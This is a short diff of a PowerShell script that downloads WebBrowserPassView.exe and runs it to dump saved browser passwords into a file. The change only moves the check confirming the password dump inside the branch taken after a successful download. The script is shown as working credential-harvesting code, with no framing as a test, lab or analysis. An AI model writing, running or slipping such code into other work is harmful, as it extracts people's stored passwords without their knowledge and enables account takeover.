@@ -16,16 +16,17 @@ try {
     if (Test-Path $outfile){
         Write-Host -ForegroundColor Green "Success: WebBrowserPassView.exe downloaded to $outfile"
         & $outfile /sxml $dumpfile
+            if(test-path $dumpfile){
+                Write-Host -ForegroundColor Green "Success: Browser passwords extracted to $dumpfile"
+            }
+            else{
+                Write-Host -ForegroundColor Red "Error: Failed to extract Browser passwords to $dumpfile"
+            }
     }
     else{
         Write-Host -ForegroundColor Red "Error: Failed to download WebBrowserPassView.exe, $dumpfile not found."
     }
-    if(test-path $dumpfile){
-        Write-Host -ForegroundColor Green "Success: Browser passwords extracted to $dumpfile"
-    }
-    else{
-        Write-Host -ForegroundColor Red "Error: Failed to extract Browser passwords to $dumpfile"
-    }
+
 }
 catch {
     Write-Error $_
